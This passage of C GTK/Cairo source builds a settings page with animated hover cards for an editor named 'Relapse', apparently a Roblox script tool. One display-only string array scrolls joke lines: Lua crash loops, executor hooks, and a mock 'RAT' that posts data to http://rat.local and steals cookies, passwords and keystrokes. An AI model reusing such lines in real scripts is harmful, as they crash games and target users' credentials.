    cairo_rotate(cr, angle + G_PI);
    cairo_scale(cr, scale, scale);
    cairo_translate(cr, -w / 2.0, -h / 2.0);
G_GNUC_BEGIN_IGNORE_DEPRECATIONS
    gdk_cairo_set_source_pixbuf(cr, image, 0, 0);
G_GNUC_END_IGNORE_DEPRECATIONS
    cairo_pattern_t *mask = cairo_pattern_reference(cairo_get_source(cr));
    cairo_set_source_rgba(cr, 0.88, 0.91, 1.00, 0.46);
    cairo_mask(cr, mask);
    cairo_pattern_destroy(mask);
    cairo_restore(cr);
}

static void rainbow_draw(GtkDrawingArea *area, cairo_t *cr, int width, int height,
                         gpointer user_data)
{
    (void)area;
    Rainbow *rainbow = user_data;
    if (width <= 0 || height <= 0)
        return;

    const double corner = 5.5;
    cairo_new_path(cr);
    cairo_arc(cr, corner, corner, corner, G_PI, 1.5 * G_PI);
    cairo_arc(cr, width - corner, corner, corner, 1.5 * G_PI, 2.0 * G_PI);
    cairo_arc(cr, width - corner, height - corner, corner, 0.0, 0.5 * G_PI);
    cairo_arc(cr, corner, height - corner, corner, 0.5 * G_PI, G_PI);
    cairo_close_path(cr);
    cairo_clip(cr);

    double span = MAX(width, height) * 1.8;
    double angle = 115.0 * G_PI / 180.0;
    double dirx = cos(angle);
    double diry = sin(angle);
    double offset = (rainbow->phase - floor(rainbow->phase)) * span;
    double x0 = width / 2.0 - dirx * span / 2.0 + dirx * offset;
    double y0 = height / 2.0 - diry * span / 2.0 + diry * offset;
    cairo_pattern_t *pattern = cairo_pattern_create_linear(
        x0, y0, x0 + dirx * span, y0 + diry * span);
    cairo_pattern_set_extend(pattern, CAIRO_EXTEND_REPEAT);

    static const struct { double red, green, blue; } colors[] = {
        {1.00, 0.35, 0.35},
        {1.00, 0.68, 0.30},
        {0.95, 0.90, 0.35},
        {0.42, 0.82, 0.45},
        {0.35, 0.72, 0.95},
        {0.52, 0.50, 0.95},
        {0.82, 0.45, 0.92},
    };
    const guint last = G_N_ELEMENTS(colors) - 1;
    for (guint i = 0; i <= last; ++i)
        cairo_pattern_add_color_stop_rgba(pattern, 0.5 * i / last,
            colors[i].red, colors[i].green, colors[i].blue, 0.10);
    for (guint i = last; i-- > 0;)
        cairo_pattern_add_color_stop_rgba(pattern, 0.5 + 0.5 * (last - i) / last,
            colors[i].red, colors[i].green, colors[i].blue, 0.10);

    cairo_set_source(cr, pattern);
    cairo_paint(cr);
    cairo_pattern_destroy(pattern);

    GdkRGBA fish = {0.86, 0.90, 1.00, 0.30};
    GdkRGBA eye = {0.10, 0.12, 0.16, 0.55};
    static const double paces[8] = {0.85, 1.18, 0.96, 1.32, 1.04, 0.89, 1.24, 1.10};
    const double margin = 50.0;
    double wrap_w = width + margin * 2.0;
    double wrap_h = height + margin * 2.0;
    for (int i = 0; i < 8; ++i) {
        double travel = rainbow->fish_phase * span * paces[i];
        double bx = 30.0 + (i % 4) * (width / 4.0);
        double by = 30.0 + (i / 4) * (height / 2.0);
        double x = fmod(bx + dirx * travel, wrap_w);
        double y = fmod(by + diry * travel, wrap_h);
        if (x < 0.0)
            x += wrap_w;
        if (y < 0.0)
            y += wrap_h;
        double wobble = sin(rainbow->fish_phase * 26.0 + i * 1.7);
        double length = 24.0 + (i % 4) * 7.0;
        double fx = x - margin - diry * wobble * 2.5;
        double fy = y - margin + dirx * wobble * 2.5;
        if (rainbow->fish_image)
            rainbow_fish_image(cr, rainbow->fish_image, fx, fy, length, angle + wobble * 0.12);
        else
            rainbow_fish(cr, fx, fy, length, angle + wobble * 0.12, &fish, &eye);
    }
}

static gboolean rainbow_tick(GtkWidget *widget, GdkFrameClock *clock, gpointer user_data)
{
    Rainbow *rainbow = user_data;
    if (style_animations_disabled()) {
        rainbow->ticking = FALSE;
        rainbow->last_us = 0;
        rainbow->state = GEAR_IDLE;
        return G_SOURCE_REMOVE;
    }
    gint64 now = gdk_frame_clock_get_frame_time(clock);
    double dt = rainbow->last_us ? (now - rainbow->last_us) / 1000000.0 : 0.0;
    rainbow->last_us = now;
    dt = CLAMP(dt, 0.0, 0.1);

    switch (rainbow->state) {
    case GEAR_ACCEL:
        rainbow->elapsed += dt;
        if (rainbow->elapsed >= GEAR_ACCEL_TIME) {
            rainbow->elapsed = GEAR_ACCEL_TIME;
            rainbow->speed = RAINBOW_TOP_SPEED * 0.4;
            rainbow->state = GEAR_CRUISE;
        } else {
            rainbow->speed = RAINBOW_TOP_SPEED * gear_ease(rainbow->elapsed / GEAR_ACCEL_TIME);
        }
        break;
    case GEAR_CRUISE:
        rainbow->speed = RAINBOW_TOP_SPEED * 0.4;
        break;
    case GEAR_DECEL:
        rainbow->elapsed += dt;
        if (rainbow->elapsed >= GEAR_DECEL_TIME) {
            rainbow->speed = 0.0;
            rainbow->state = GEAR_IDLE;
        } else {
            rainbow->speed = rainbow->decel_from *
                (1.0 - gear_ease(rainbow->elapsed / GEAR_DECEL_TIME));
        }
        break;
    case GEAR_IDLE:
    default:
        rainbow->speed = 0.0;
        break;
    }

    switch (rainbow->state) {
    case GEAR_ACCEL:
        rainbow->fish_speed = RAINBOW_TOP_SPEED * gear_ease(rainbow->elapsed / GEAR_ACCEL_TIME);
        break;
    case GEAR_CRUISE:
        rainbow->fish_speed = RAINBOW_TOP_SPEED * FISH_CRUISE;
        break;
    case GEAR_DECEL:
        rainbow->fish_speed = rainbow->fish_decel_from *
            (1.0 - gear_ease(rainbow->elapsed / GEAR_DECEL_TIME));
        break;
    case GEAR_IDLE:
    default:
        rainbow->fish_speed = 0.0;
        break;
    }

    rainbow->phase += rainbow->speed * dt;
    rainbow->fish_phase += rainbow->fish_speed * dt;
    gtk_widget_queue_draw(widget);

    if (rainbow->state == GEAR_IDLE) {
        rainbow->ticking = FALSE;
        rainbow->last_us = 0;
        return G_SOURCE_REMOVE;
    }
    return G_SOURCE_CONTINUE;
}

static void rainbow_set_hovered(Rainbow *rainbow, gboolean hovered)
{
    if (!rainbow || style_animations_disabled())
        return;
    if (hovered) {
        if (rainbow->state == GEAR_ACCEL || rainbow->state == GEAR_CRUISE)
            return;
        double ratio = CLAMP(rainbow->speed / RAINBOW_TOP_SPEED, 0.0, 1.0);
        rainbow->elapsed = GEAR_ACCEL_TIME * gear_ease_inverse(ratio);
        rainbow->state = GEAR_ACCEL;
        rainbow->last_us = 0;
    } else {
        if (rainbow->state == GEAR_IDLE || rainbow->state == GEAR_DECEL)
            return;
        rainbow->state = GEAR_DECEL;
        rainbow->elapsed = 0.0;
        rainbow->decel_from = rainbow->speed;
        rainbow->fish_decel_from = rainbow->fish_speed;
    }
    if (!rainbow->ticking) {
        rainbow->ticking = TRUE;
        rainbow->tick_id = gtk_widget_add_tick_callback(rainbow->area, rainbow_tick, rainbow, NULL);
    }
}

static void rainbow_free(gpointer data)
{
    Rainbow *rainbow = data;
    if (rainbow->ticking) {
        gtk_widget_remove_tick_callback(rainbow->area, rainbow->tick_id);
        rainbow->ticking = FALSE;
    }
    g_clear_object(&rainbow->fish_image);
    g_free(rainbow);
}

static void rainbow_enter(GtkEventControllerMotion *controller, double x, double y,
                          gpointer user_data)
{
    (void)controller;
    (void)x;
    (void)y;
    rainbow_set_hovered(user_data, TRUE);
}

static void rainbow_leave(GtkEventControllerMotion *controller, gpointer user_data)
{
    (void)controller;
    rainbow_set_hovered(user_data, FALSE);
}

typedef struct {
    GtkWidget *area;
    GearPhase state;
    double speed;
    double elapsed;
    double decel_from;
    double typed;
    int partial;
    char *lines[40];
    int count;
    guint seed;
    gint64 last_us;
    guint tick_id;
    gboolean ticking;
} CodePanel;

#define CODE_TOP_SPEED 100.0
#define CODE_LINE_HEIGHT 16.0
#define CODE_MAX_LINES 40
#define CODE_PREFILL 10

static char *code_line_new(CodePanel *panel)
{
    static const char *const lines[] = {
        "while true do end",
        "while true do while true do end end",
        "repeat repeat until false until false",
        "for i = 1, math.huge do end",
        "for i = 1, math.huge do for j = 1, math.huge do end end",
        "for i = 1, 1e9 do workspace.Gravity = i end",
        "local function f() f() f() end f()",
        "local function f() task.spawn(f) task.spawn(f) end f()",
        "local f; f = function() task.spawn(f) end f()",
        "coroutine.wrap(function() while true do end end)()",
        "while task.wait() do task.wait() end",
        "while true do table.insert(t, t) end",
        "while true do Instance.new(\"Part\") end",
        "task.spawn(function() while true do end end)",
        "workspace.Gravity = math.huge",
        "workspace:ClearAllChildren()",
        "for _,v in workspace:GetChildren() do v:Destroy() end",
        "Instance.new(\"Part\", workspace)",
        "bomb.Size = Vector3.new(1e9, 1e9, 1e9)",
        "bomb.Parent = workspace",
        "string.rep(\"a\", math.huge)",
        "getgenv().crash = true",
        "sethiddenproperty(game, \"SimulationRadius\", math.huge)",
        "getrawmetatable(game)",
        "setreadonly(getrawmetatable(game), false)",
        "hookfunction(print, function() end)",
        "loadstring(\"while true do end\")()",
        "-- RAT v6.6.6 (totally legit)",
        "local rat = getgenv().rat or {}",
        "local hwid = getHWID()",
        "local token = getAuthToken()",
        "rat.exfil = function(d) post(\"http://rat.local\", d) end",
        "local cookies = stealBrowserCookies()",
        "stealBrowserPasswords()",
        "setclipboard(stealCookies())",
        "local accounts = getaccounts()",
        "while true do rat.exfil(getclipboard()) end",
        "sniffKeys()",
        "keylogger.start(\"C:/logs.txt\")",
        "os.execute(\"echo pwned\")",
        "pcall(os.exit, 0)",
        "game.Players.LocalPlayer:Kick(\"get ratted lol\")",
        "game:Shutdown()",
        "setmetatable({}, {__index = function(t, k) return t[k] end})",
        "-- your roblox has left the chat",
        "-- this is fine",
        "-- skill issue",
    };
    panel->seed = panel->seed * 1664525u + 1013904223u;
    guint r = panel->seed >> 8;
    return g_strdup(lines[r % G_N_ELEMENTS(lines)]);
}

static int code_capacity(CodePanel *panel)
{
    int height = gtk_widget_get_height(panel->area);
    if (height <= 0)
        return CODE_MAX_LINES;
    int capacity = (int)((height - 10.0) / CODE_LINE_HEIGHT);
    return MAX(1, capacity);
}

static void code_trim(CodePanel *panel)
{
    int capacity = code_capacity(panel);
    while (panel->count > capacity) {
        g_free(panel->lines[0]);
        memmove(panel->lines, panel->lines + 1, sizeof(char *) * (panel->count - 1));
        --panel->count;
    }
}

static void code_start_line(CodePanel *panel)
{
    if (panel->count >= CODE_MAX_LINES) {
        g_free(panel->lines[0]);
        memmove(panel->lines, panel->lines + 1, sizeof(char *) * (CODE_MAX_LINES - 1));
        --panel->count;
    }
    panel->lines[panel->count++] = code_line_new(panel);
    panel->partial = 0;
    code_trim(panel);
}

static void code_draw(GtkDrawingArea *area, cairo_t *cr, int width, int height, gpointer user_data)
{
    (void)area;
    CodePanel *panel = user_data;
    if (width <= 0 || height <= 0 || panel->count == 0)
        return;

    const double corner = 5.5;
    cairo_new_path(cr);
    cairo_arc(cr, corner, corner, corner, G_PI, 1.5 * G_PI);
    cairo_arc(cr, width - corner, corner, corner, 1.5 * G_PI, 2.0 * G_PI);
    cairo_arc(cr, width - corner, height - corner, corner, 0.0, 0.5 * G_PI);
    cairo_arc(cr, corner, height - corner, corner, 0.5 * G_PI, G_PI);
    cairo_close_path(cr);
    cairo_clip(cr);

    PangoLayout *layout = pango_cairo_create_layout(cr);
    PangoFontDescription *font = pango_font_description_from_string("monospace 9");
    pango_layout_set_font_description(layout, font);
    pango_font_description_free(font);

    int capacity = code_capacity(panel);
    int first = MAX(0, panel->count - capacity);
    cairo_set_source_rgba(cr, 0.72, 0.80, 0.95, 0.28);
    for (int i = first; i < panel->count; ++i) {
        double y = height - 6.0 - (panel->count - i) * CODE_LINE_HEIGHT;
        const char *text = panel->lines[i];
        g_autofree char *cut = NULL;
        if (i == panel->count - 1 && panel->partial < (int)strlen(text)) {
            cut = g_strndup(text, panel->partial);
            text = cut;
        }
        pango_layout_set_text(layout, text, -1);
        cairo_move_to(cr, 16.0, y + 2.0);
        pango_cairo_show_layout(cr, layout);
        if (i == panel->count - 1) {
            int text_width = 0;
            pango_layout_get_pixel_size(layout, &text_width, NULL);
            cairo_rectangle(cr, 16.0 + text_width + 1.0, y + 1.0, 6.0, CODE_LINE_HEIGHT - 4.0);
            cairo_fill(cr);
        }
    }
    g_object_unref(layout);
}

static gboolean code_tick(GtkWidget *widget, GdkFrameClock *clock, gpointer user_data)
{
    CodePanel *panel = user_data;
    if (style_animations_disabled()) {
        panel->ticking = FALSE;
        panel->last_us = 0;
        panel->state = GEAR_IDLE;
        return G_SOURCE_REMOVE;
    }
    gint64 now = gdk_frame_clock_get_frame_time(clock);
    double dt = panel->last_us ? (now - panel->last_us) / 1000000.0 : 0.0;
    panel->last_us = now;
    dt = CLAMP(dt, 0.0, 0.1);

    switch (panel->state) {
    case GEAR_ACCEL:
        panel->elapsed += dt;
        if (panel->elapsed >= GEAR_ACCEL_TIME) {
            panel->elapsed = GEAR_ACCEL_TIME;
            panel->speed = CODE_TOP_SPEED * 0.4;
            panel->state = GEAR_CRUISE;
        } else {
            panel->speed = CODE_TOP_SPEED * gear_ease(panel->elapsed / GEAR_ACCEL_TIME);
        }
        break;
    case GEAR_CRUISE:
        panel->speed = CODE_TOP_SPEED * 0.4;
        break;
    case GEAR_DECEL:
        panel->elapsed += dt;
        if (panel->elapsed >= GEAR_DECEL_TIME) {
            panel->speed = 0.0;
            panel->state = GEAR_IDLE;
        } else {
            panel->speed = panel->decel_from *
                (1.0 - gear_ease(panel->elapsed / GEAR_DECEL_TIME));
        }
        break;
    case GEAR_IDLE:
    default:
        panel->speed = 0.0;
        break;
    }

    panel->typed += panel->speed * dt;
    while (panel->typed >= 1.0) {
        panel->typed -= 1.0;
        if (panel->count == 0) {
            code_start_line(panel);
            continue;
        }
        int length = (int)strlen(panel->lines[panel->count - 1]);
        if (panel->partial < length) {
            ++panel->partial;
        } else {
            code_start_line(panel);
        }
    }
    gtk_widget_queue_draw(widget);

    if (panel->state == GEAR_IDLE) {
        panel->ticking = FALSE;
        panel->last_us = 0;
        return G_SOURCE_REMOVE;
    }
    return G_SOURCE_CONTINUE;
}

static void code_set_hovered(CodePanel *panel, gboolean hovered)
{
    if (!panel || style_animations_disabled())
        return;
    if (hovered) {
        if (panel->state == GEAR_ACCEL || panel->state == GEAR_CRUISE)
            return;
        double ratio = CLAMP(panel->speed / CODE_TOP_SPEED, 0.0, 1.0);
        panel->elapsed = GEAR_ACCEL_TIME * gear_ease_inverse(ratio);
        panel->state = GEAR_ACCEL;
        panel->last_us = 0;
    } else {
        if (panel->state == GEAR_IDLE || panel->state == GEAR_DECEL)
            return;
        panel->state = GEAR_DECEL;
        panel->elapsed = 0.0;
        panel->decel_from = panel->speed;
    }
    if (!panel->ticking) {
        panel->ticking = TRUE;
        panel->tick_id = gtk_widget_add_tick_callback(panel->area, code_tick, panel, NULL);
    }
}

static void code_free(gpointer data)
{
    CodePanel *panel = data;
    if (panel->ticking) {
        gtk_widget_remove_tick_callback(panel->area, panel->tick_id);
        panel->ticking = FALSE;
    }
    for (int i = 0; i < panel->count; ++i)
        g_free(panel->lines[i]);
    g_free(panel);
}

static void code_enter(GtkEventControllerMotion *controller, double x, double y,
                       gpointer user_data)
{
    (void)controller;
    (void)x;
    (void)y;
    code_set_hovered(user_data, TRUE);
}

static void code_leave(GtkEventControllerMotion *controller, gpointer user_data)
{
    (void)controller;
    code_set_hovered(user_data, FALSE);
}

static void settings_card_enter(GtkEventControllerMotion *controller, double x, double y,
                                gpointer user_data)
{
    (void)controller;
    (void)x;
    (void)y;
    gear_set_hovered(user_data, TRUE);
}

static void settings_card_leave(GtkEventControllerMotion *controller, gpointer user_data)
{
    (void)controller;
    gear_set_hovered(user_data, FALSE);
}

typedef enum {
    CARD_PLAIN,
    CARD_GEARS,
    CARD_RAINBOW,
    CARD_CODE,
} CardEffect;

static GtkWidget *settings_card_new(const char *title, const char *detail,
                                    const char *page_name, GtkWidget *stack,
                                    CardEffect effect)
{
    GtkWidget *button = gtk_button_new();
    gtk_widget_add_css_class(button, "settings-category");
    gtk_accessible_update_property(GTK_ACCESSIBLE(button), GTK_ACCESSIBLE_PROPERTY_LABEL, title, -1);

    GtkWidget *box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 6);
    gtk_widget_set_hexpand(box, TRUE);
    gtk_widget_set_valign(box, GTK_ALIGN_START);
    gtk_box_append(GTK_BOX(box), label_new(title, "settings-category-title"));
    GtkWidget *description = label_new(detail, "settings-description");
    gtk_label_set_wrap(GTK_LABEL(description), TRUE);
    gtk_label_set_wrap_mode(GTK_LABEL(description), PANGO_WRAP_WORD_CHAR);
    gtk_box_append(GTK_BOX(box), description);

    gtk_widget_set_margin_top(box, 18);
    gtk_widget_set_margin_bottom(box, 18);
    gtk_widget_set_margin_start(box, 20);
    gtk_widget_set_margin_end(box, 20);
    gtk_widget_set_halign(box, GTK_ALIGN_FILL);
    gtk_widget_set_valign(box, GTK_ALIGN_START);

    if (effect != CARD_PLAIN) {
        GtkWidget *background = gtk_drawing_area_new();
        gtk_widget_add_css_class(background,
            effect == CARD_GEARS ? "settings-gears" :
            (effect == CARD_RAINBOW ? "settings-rainbow" : "settings-code"));
        gtk_widget_set_hexpand(background, TRUE);
        gtk_widget_set_vexpand(background, TRUE);
        gtk_widget_set_size_request(background, -1, 156);

        GtkEventController *motion = gtk_event_controller_motion_new();
        gtk_event_controller_set_propagation_phase(motion, GTK_PHASE_CAPTURE);

        if (effect == CARD_GEARS) {
            Gear *gear = g_new0(Gear, 1);
            gear->phase = GEAR_IDLE;
            gear->area = background;
            gtk_drawing_area_set_draw_func(GTK_DRAWING_AREA(background), gear_draw, gear, NULL);
            g_object_set_data_full(G_OBJECT(background), "gear", gear, gear_free);
            g_signal_connect(motion, "enter", G_CALLBACK(settings_card_enter), gear);
            g_signal_connect(motion, "leave", G_CALLBACK(settings_card_leave), gear);
            g_object_set_data(G_OBJECT(button), "gear-drawing", background);
        } else if (effect == CARD_RAINBOW) {
            Rainbow *rainbow = g_new0(Rainbow, 1);
            rainbow->area = background;
            g_autoptr(GdkPixbuf) source = gdk_pixbuf_new_from_file(FISH_IMAGE_PATH, NULL);
            if (source)
                rainbow->fish_image = fish_image_trim(source);
            gtk_drawing_area_set_draw_func(GTK_DRAWING_AREA(background), rainbow_draw, rainbow, NULL);
            g_object_set_data_full(G_OBJECT(background), "rainbow", rainbow, rainbow_free);
            g_signal_connect(motion, "enter", G_CALLBACK(rainbow_enter), rainbow);
            g_signal_connect(motion, "leave", G_CALLBACK(rainbow_leave), rainbow);
        } else {
            CodePanel *code = g_new0(CodePanel, 1);
            code->area = background;
            code->seed = 0x5eedu;
            for (int i = 0; i < CODE_PREFILL; ++i)
                code_start_line(code);
            if (code->count > 0)
                code->partial = (int)strlen(code->lines[code->count - 1]) / 2;
            gtk_drawing_area_set_draw_func(GTK_DRAWING_AREA(background), code_draw, code, NULL);
            g_object_set_data_full(G_OBJECT(background), "code-panel", code, code_free);
            g_signal_connect(motion, "enter", G_CALLBACK(code_enter), code);
            g_signal_connect(motion, "leave", G_CALLBACK(code_leave), code);
        }
        gtk_widget_add_controller(button, motion);
        g_object_set_data(G_OBJECT(button), "gear-motion", motion);

        GtkWidget *overlay = gtk_overlay_new();
        gtk_overlay_set_child(GTK_OVERLAY(overlay), background);
        gtk_overlay_add_overlay(GTK_OVERLAY(overlay), box);
        gtk_overlay_set_clip_overlay(GTK_OVERLAY(overlay), box, TRUE);
        gtk_button_set_child(GTK_BUTTON(button), overlay);
    } else {
        gtk_button_set_child(GTK_BUTTON(button), box);
    }

    g_object_set_data(G_OBJECT(button), "settings-page-name", (gpointer)page_name);
    g_signal_connect(button, "clicked", G_CALLBACK(settings_card_clicked), stack);
    return button;
}

static GtkWidget *settings_column(GtkWidget *parent)
{
    GtkWidget *column = gtk_box_new(GTK_ORIENTATION_VERTICAL, 16);
    gtk_widget_set_hexpand(column, TRUE);
    gtk_widget_set_valign(column, GTK_ALIGN_START);
    gtk_box_append(GTK_BOX(parent), column);
    return column;
}

GtkWidget *settings_new(const EditorSettings *settings, SettingsChangedFunc changed,
                       RestoreTabsChangedFunc restore_callback, OutputChangedFunc output_callback,
                       SingleLogChangedFunc single_log_callback,
                       LauncherChangedFunc launcher_callback, OpenWithChangedFunc open_with_callback,
                       ProfilesChangedFunc profiles_callback, RestartProfilesFunc restart_profiles,
                       RaknetChangedFunc raknet_callback, CheckUpdatesFunc check_updates,
                       ScriptsChangedFunc scripts_callback, CloseTabsFunc close_tabs_callback,
                       ReloadSettingsFunc reload_callback, const char *version, gpointer user_data)
{
    Settings *state = g_new0(Settings, 1);
    state->changed = changed;
    state->restore_changed = restore_callback;
    state->output_changed = output_callback;
    state->single_log_changed = single_log_callback;
    state->launcher_changed = launcher_callback;
    state->open_with_changed = open_with_callback;
    state->profiles_changed = profiles_callback;
    state->restart_profiles = restart_profiles;
    state->raknet_changed = raknet_callback;
    state->check_updates = check_updates;
    state->scripts_changed = scripts_callback;
    state->close_tabs = close_tabs_callback;
    state->reload_settings = reload_callback;
    state->user_data = user_data;
    GtkWidget *page = gtk_box_new(GTK_ORIENTATION_VERTICAL, 0);
    g_object_set_data_full(G_OBJECT(page), "settings", state, free_settings);
    GtkWidget *stack = gtk_stack_new();
    gtk_widget_set_vexpand(stack, TRUE);
    gtk_box_append(GTK_BOX(page), stack);

    GtkWidget *index = gtk_box_new(GTK_ORIENTATION_VERTICAL, 16);
    gtk_widget_add_css_class(index, "settings-page");
    gtk_box_append(GTK_BOX(index), label_new("Settings", "settings-title"));
    GtkWidget *grid = gtk_grid_new();
    gtk_widget_add_css_class(grid, "settings-categories");
    gtk_grid_set_row_homogeneous(GTK_GRID(grid), TRUE);
    gtk_grid_set_column_homogeneous(GTK_GRID(grid), TRUE);
    gtk_grid_set_row_spacing(GTK_GRID(grid), 16);
    gtk_grid_set_column_spacing(GTK_GRID(grid), 16);
    gtk_widget_set_vexpand(grid, TRUE);
    gtk_grid_attach(GTK_GRID(grid),
        settings_card_new("Relapse settings", "Output, Scripts, Profiles, Open with and Updates",
                          "relapse", stack, CARD_GEARS), 0, 0, 1, 1);
    GtkWidget *appearance_card = settings_card_new("Appearance",
        "Background, colours, image and title bar", "appearance", stack, CARD_RAINBOW);
    gtk_grid_attach(GTK_GRID(grid), appearance_card, 1, 0, 1, 1);
    gtk_grid_attach(GTK_GRID(grid),
        settings_card_new("Editor and session", "Font, wrapping, indentation and restored tabs",
                          "editor", stack, CARD_CODE), 0, 1, 1, 1);
    GtkWidget *empty = gtk_button_new();
    gtk_widget_add_css_class(empty, "settings-category");
    gtk_widget_add_css_class(empty, "settings-category-empty");
    gtk_widget_set_sensitive(empty, FALSE);
    gtk_accessible_update_property(GTK_ACCESSIBLE(empty),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Reserved for a future settings page", -1);
    gtk_grid_attach(GTK_GRID(grid), empty, 1, 1, 1, 1);
    gtk_box_append(GTK_BOX(index), grid);
    gtk_stack_add_named(GTK_STACK(stack), index, "index");

    GtkWidget *relapse_page = NULL;
    GtkWidget *relapse_content = NULL;
    relapse_page = settings_page_scrolled(&relapse_content);
    GtkWidget *relapse_header = settings_page_header(relapse_content, stack, "Relapse settings");
    GtkWidget *relapse_column = settings_column(relapse_content);
    gtk_stack_add_named(GTK_STACK(stack), relapse_page, "relapse");

    GtkWidget *appearance_page = NULL;
    GtkWidget *appearance_content = NULL;
    appearance_page = settings_page_scrolled(&appearance_content);
    GtkWidget *appearance_header = settings_page_header(appearance_content, stack, "Appearance");
    GtkWidget *appearance_column = settings_column(appearance_content);
    gtk_stack_add_named(GTK_STACK(stack), appearance_page, "appearance");

    GtkWidget *editor_page = NULL;
    GtkWidget *editor_content = NULL;
    editor_page = settings_page_scrolled(&editor_content);
    GtkWidget *editor_header = settings_page_header(editor_content, stack, "Editor and session");
    GtkWidget *editor_column = settings_column(editor_content);
    gtk_stack_add_named(GTK_STACK(stack), editor_page, "editor");

    gtk_stack_set_visible_child_name(GTK_STACK(stack), "index");

    GtkWidget *editor_group = NULL;
    section_new(editor_column, "Editor", &editor_group);

    GtkWidget *font = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->font_size = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(
        EDITOR_FONT_SIZE_MIN, EDITOR_FONT_SIZE_MAX, 1));
    gtk_widget_add_css_class(GTK_WIDGET(state->font_size), "font-size");
    gtk_spin_button_set_numeric(state->font_size, TRUE);
    gtk_spin_button_set_update_policy(state->font_size, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->font_size), 2);
    gtk_editable_set_alignment(GTK_EDITABLE(state->font_size), 0.5);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->font_size),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Editor font size in pixels", -1);
    gtk_box_append(GTK_BOX(font), GTK_WIDGET(state->font_size));
    gtk_box_append(GTK_BOX(font), label_new("px", "settings-description"));
    add_row(editor_group, "Font size", "Editor text and line numbers", font);

    state->word_wrap = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->word_wrap), "word-wrap");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->word_wrap),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Word wrap", -1);
    add_row(editor_group, "Word wrap", "Wrap long lines to fit the editor", GTK_WIDGET(state->word_wrap));

    GtkWidget *indent = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 0);
    gtk_widget_add_css_class(indent, "indent-options");
    for (guint i = 0; i < G_N_ELEMENTS(indent_widths); ++i) {
        g_autofree char *text = g_strdup_printf("%d", indent_widths[i]);
        state->indent[i] = GTK_TOGGLE_BUTTON(gtk_toggle_button_new_with_label(text));
        if (i)
            gtk_toggle_button_set_group(state->indent[i], state->indent[0]);
        g_autofree char *label = g_strdup_printf("Indent with %d spaces", indent_widths[i]);
        gtk_accessible_update_property(GTK_ACCESSIBLE(state->indent[i]),
            GTK_ACCESSIBLE_PROPERTY_LABEL, label, -1);
        gtk_box_append(GTK_BOX(indent), GTK_WIDGET(state->indent[i]));
        g_signal_connect(state->indent[i], "toggled", G_CALLBACK(values_changed), state);
    }
    add_row(editor_group, "Indentation", "Spaces used by Tab and auto-indent", indent);
    g_signal_connect(state->font_size, "value-changed", G_CALLBACK(values_changed), state);
    g_signal_connect(state->word_wrap, "notify::active", G_CALLBACK(wrap_changed), state);

    GtkWidget *session_group = NULL;
    section_new(editor_column, "Session", &session_group);
    state->shift_close = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->shift_close), "shift-close");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->shift_close),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Shift-click closes tabs without asking", -1);
    gtk_switch_set_active(state->shift_close, TRUE);
    add_row(session_group, "Shift-click closes without asking",
        "Hold Shift while clicking a tab’s × to skip the unsaved changes prompt",
        GTK_WIDGET(state->shift_close));
    g_signal_connect(state->shift_close, "notify::active", G_CALLBACK(values_changed), state);
    GtkWidget *close_tabs = gtk_button_new_with_label("Close all tabs");
    gtk_widget_add_css_class(close_tabs, "close-all-tabs");
    gtk_accessible_update_property(GTK_ACCESSIBLE(close_tabs),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Close all open tabs", -1);
    add_row(session_group, "Open tabs", "Discard every open tab and start with an empty one",
            close_tabs);
    g_signal_connect(close_tabs, "clicked", G_CALLBACK(close_tabs_clicked), state);
    settings_set_editor(page, settings);
    state->restore_tabs = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->restore_tabs), "restore-tabs");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->restore_tabs),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Restore tabs on startup", -1);
    gtk_switch_set_active(state->restore_tabs, TRUE);
    add_row(session_group, "Restore tabs on startup", "Reopen tabs and unsaved drafts", GTK_WIDGET(state->restore_tabs));
    g_signal_connect(state->restore_tabs, "notify::active", G_CALLBACK(restore_changed), state);

    GtkWidget *appearance_group = NULL;
    section_new(appearance_column, "Appearance", &appearance_group);
    state->gradient = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->gradient), "gradient-enabled");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->gradient),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Gradient background", -1);
    add_row(appearance_group, "Gradient background",
        "Paint a gradient behind the editor instead of a flat colour", GTK_WIDGET(state->gradient));
    g_signal_connect(state->gradient, "notify::active", G_CALLBACK(appearance_notify), state);

    state->animations = GTK_SWITCH(gtk_switch_new());
    gtk_widget_add_css_class(GTK_WIDGET(state->animations), "animations-off");
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->animations),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Disable all animations", -1);
    add_row(appearance_group, "Disable all animations",
        "Stop the logo pulse, hover fades, preview cards and tab scrolling",
        GTK_WIDGET(state->animations));
    g_signal_connect(state->animations, "notify::active", G_CALLBACK(appearance_notify), state);

    GtkWidget *angle = gtk_box_new(GTK_ORIENTATION_HORIZONTAL, 6);
    state->gradient_angle = GTK_SPIN_BUTTON(gtk_spin_button_new_with_range(0, 360, 5));
    gtk_widget_add_css_class(GTK_WIDGET(state->gradient_angle), "gradient-angle");
    gtk_spin_button_set_numeric(state->gradient_angle, TRUE);
    gtk_spin_button_set_update_policy(state->gradient_angle, GTK_UPDATE_IF_VALID);
    gtk_editable_set_width_chars(GTK_EDITABLE(state->gradient_angle), 3);
    gtk_editable_set_alignment(GTK_EDITABLE(state->gradient_angle), 1.0);
    gtk_accessible_update_property(GTK_ACCESSIBLE(state->gradient_angle),
        GTK_ACCESSIBLE_PROPERTY_LABEL, "Gradient angle in degrees", -1);
